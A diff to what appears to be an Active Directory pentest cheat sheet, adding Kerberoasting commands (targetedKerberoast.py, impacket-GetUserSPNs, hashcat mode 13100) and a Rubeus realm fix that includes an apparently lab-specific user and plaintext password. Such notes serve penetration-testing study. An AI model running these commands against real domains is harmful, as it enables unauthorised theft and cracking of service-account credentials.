@@ -199,6 +199,50 @@ Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipaln
 Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipalname -Verbose
 ```
 
+From Linux, `targetedKerberoast.py` can automate the temporary SPN add, ticket request, and cleanup for one target user:
+
+```bash
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+python3 targetedKerberoast.py -v -d DOMAIN -u 'CONTROLLED.USER' -p 'PASSWORD' \
+  --dc-ip DC_IP -f hashcat --request-user 'TARGET.USER'
+```
+
+For regular Kerberoasting from Linux:
+
+```bash
+impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/USER:'PASSWORD'
+impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:'PASSWORD'
+hashcat -a0 -m 13100 hash /path/to/wordlist
+```
+
+### Rubeus Kerberoast SPN Realm Fix
+
+If Rubeus requests the wrong SPN realm or returns an `InitializeSecurityContent failed` error, be explicit about the domain, DC, credential user, and SPN.
+
+Example error:
+
+```text
+[X] Error during request for SPN MSSQL/nagoya.nagoya-industries.com@nagoya-industries.com : InitializeSecurityContent failed. Ensure the service principal name is correct.
+```
+
+Original command that was too implicit:
+
+```powershell
+.\Rubeus.exe kerberoast /domain:nagoya-industries.com /creduser:Christopher.Lewis@nagoya-industries.com /credpassword:'newP@ssword2022' /nowrap
+```
+
+Working command with explicit domain, DC, credential user, and target SPN:
+
+```powershell
+.\Rubeus.exe kerberoast /domain:nagoya-industries.com /dc:nagoya.nagoya-industries.com /creduser:nagoya-industries.com\Christopher.Lewis /credpassword:newP@ssword2022 /spn:MSSQL/nagoya.nagoya-industries.com /nowrap
+```
+
+Generic form:
+
+```powershell
+.\Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_FQDN /creduser:DOMAIN\USER /credpassword:PASSWORD /spn:SERVICE/HOST_FQDN /nowrap
+```
+
 ### Kerberoasting Mitigation
 
 * Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
